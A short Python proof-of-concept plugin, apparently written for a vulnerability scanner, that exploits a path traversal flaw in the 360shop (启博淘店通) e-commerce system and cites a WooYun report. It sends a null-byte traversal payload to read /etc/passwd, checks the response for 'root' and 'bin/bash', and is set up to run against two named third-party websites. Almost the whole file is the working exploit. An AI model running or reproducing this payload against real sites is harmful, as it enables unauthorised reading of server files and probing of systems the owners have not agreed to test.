#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:启博淘店通标准版任意文件遍历漏洞
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0148274
#Author:xq17
def assign(service, arg):
    if service == "360shop":
        return True, arg

def audit(arg):
    payload = arg + "?mod=goods&do=../../../../../../../../../etc/passwd%00.jpg&class_id=25"
    code, head, res, errcode, _ = curl.curl2(payload)
    if code ==200 and 'bin/bash' in res and "root" in res:
         security_info(payload+':Any reading ' )
         
if __name__ == '__main__':
        from dummy import *
        audit(assign('360shop','http://www.10n9w.com/')[1])
        audit(assign('360shop','http://www.xingcl.com/')[1])